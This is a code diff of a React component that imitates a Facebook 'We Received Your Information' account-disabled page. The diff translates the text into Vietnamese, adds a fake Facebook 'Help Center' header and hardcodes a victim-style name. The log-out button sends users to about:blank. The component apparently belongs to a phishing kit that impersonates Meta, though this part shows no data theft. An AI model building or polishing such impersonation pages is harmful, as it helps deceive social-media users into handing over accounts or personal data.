@@ -1,4 +1,4 @@
-import Logo1 from '@/assets/images/logo1.png';
+import icon from '@/assets/images/icon.webp';
 import { faDownload } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
@@ -7,18 +7,9 @@ import { translateText } from '@/utils/translate';
 const SendInfo = () => {
     const defaultTexts = useMemo(
         () => ({
-            title: 'We Received Your Information',
-            description1: 'If we still find that you\'re not old enough to be on Facebook, your account will remain disabled. This is because your account doesn\'t follow our Terms of Service.',
-            description2: 'We\'re always looking out for the security of people on Facebook, so until then you can\'t use your account.',
-            logOut: 'Log Out From Iqbal Safi',
-            downloadInfo: 'Download Your Information',
-            englishUS: 'English (US)',
-            deutsch: 'Deutsch',
-            turkce: 'Türkçe',
-            polski: 'Polski',
-            italiano: 'Italiano',
-            farsi: 'ڤاريس',
-            pashto: '٢يشتو'
+            title: 'Chúng tôi đã nhận được thông tin của bạn',
+            description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
+            description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
         }),
         []
     );
@@ -32,43 +23,16 @@ const SendInfo = () => {
                     translatedTitle,
                     translatedDesc1,
                     translatedDesc2,
-                    translatedLogOut,
-                    translatedDownload,
-                    translatedEnglish,
-                    translatedDeutsch,
-                    translatedTurkce,
-                    translatedPolski,
-                    translatedItaliano,
-                    translatedFarsi,
-                    translatedPashto
                 ] = await Promise.all([
                     translateText(defaultTexts.title, targetLang),
                     translateText(defaultTexts.description1, targetLang),
                     translateText(defaultTexts.description2, targetLang),
-                    translateText(defaultTexts.logOut, targetLang),
-                    translateText(defaultTexts.downloadInfo, targetLang),
-                    translateText(defaultTexts.englishUS, targetLang),
-                    translateText(defaultTexts.deutsch, targetLang),
-                    translateText(defaultTexts.turkce, targetLang),
-                    translateText(defaultTexts.polski, targetLang),
-                    translateText(defaultTexts.italiano, targetLang),
-                    translateText(defaultTexts.farsi, targetLang),
-                    translateText(defaultTexts.pashto, targetLang)
                 ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
                     description1: translatedDesc1,
                     description2: translatedDesc2,
-                    logOut: translatedLogOut,
-                    downloadInfo: translatedDownload,
-                    englishUS: translatedEnglish,
-                    deutsch: translatedDeutsch,
-                    turkce: translatedTurkce,
-                    polski: translatedPolski,
-                    italiano: translatedItaliano,
-                    farsi: translatedFarsi,
-                    pashto: translatedPashto
                 });
             } catch {
                 //
@@ -92,27 +56,20 @@ const SendInfo = () => {
         window.location.href = 'about:blank';
     };
 
-    const languages = [
-        { code: 'en', name: translatedTexts.englishUS },
-        { code: 'de', name: translatedTexts.deutsch },
-        { code: 'ps', name: translatedTexts.pashto },
-        { code: 'fa', name: translatedTexts.farsi },
-        { code: 'tr', name: translatedTexts.turkce },
-        { code: 'pl', name: translatedTexts.polski },
-        { code: 'it', name: translatedTexts.italiano }
-    ];
-
     return (
         <div className='min-h-screen bg-gray-100'>
-            {/* Header */}
+            {/* Header với Help Center */}
             <header className='bg-white border-b border-gray-300'>
-                <div className='max-w-6xl mx-auto px-4 py-4'>
-                    <div className='flex items-center justify-center'>
-                        <img 
-                            src={Logo1} 
-                            alt='Facebook' 
-                            className='h-8 w-auto'
-                        />
+                <div className='max-w-6xl mx-auto px-4 py-3'>
+                    <div className='flex items-center justify-between'>
+                        <div className='flex items-center space-x-3'>
+                            <img 
+                                src={icon} 
+                                alt='Facebook' 
+                                className='h-8 w-8'
+                            />
+                            <span className='text-lg font-semibold'>Trung tâm trợ giúp</span>
+                        </div>
                     </div>
                 </div>
             </header>
@@ -143,7 +100,7 @@ const SendInfo = () => {
                             onClick={handleLogOut}
                             className='w-full text-left text-blue-600 hover:text-blue-800 font-medium py-2'
                         >
-                            <strong>{translatedTexts.logOut}</strong>
+                            <strong>Đăng xuất khỏi Iqbal Safi</strong>
                         </button>
 
                         <button
@@ -151,50 +108,13 @@ const SendInfo = () => {
                             className='w-full flex items-center space-x-2 text-blue-600 hover:text-blue-800 font-medium py-2'
                         >
                             <FontAwesomeIcon icon={faDownload} />
-                            <span>{translatedTexts.downloadInfo}</span>
+                            <span>Tải xuống thông tin của bạn</span>
                         </button>
                     </div>
                 </div>
 
-                {/* Language Selector */}
-                <div className='mt-6 bg-white rounded-none shadow-sm border border-gray-300'>
-                    <div className='px-6 py-4'>
-                        <div className='grid grid-cols-2 gap-4'>
-                            <div className='space-y-2'>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.englishUS}
-                                </button>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.deutsch}
-                                </button>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.turkce}
-                                </button>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.polski}
-                                </button>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.italiano}
-                                </button>
-                            </div>
-                            <div className='space-y-2'>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.farsi}
-                                </button>
-                                <button className='block w-full text-left text-blue-600 hover:text-blue-800 text-sm py-1'>
-                                    {translatedTexts.pashto}
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                {/* Footer */}
-                <footer className='mt-6 text-center'>
-                    <p className='text-gray-500 text-xs'>
-                        Meta © {new Date().getFullYear()}
-                    </p>
-                </footer>
+                {/* Khoảng trắng phía dưới */}
+                <div className='mt-6'></div>
             </main>
         </div>
     );
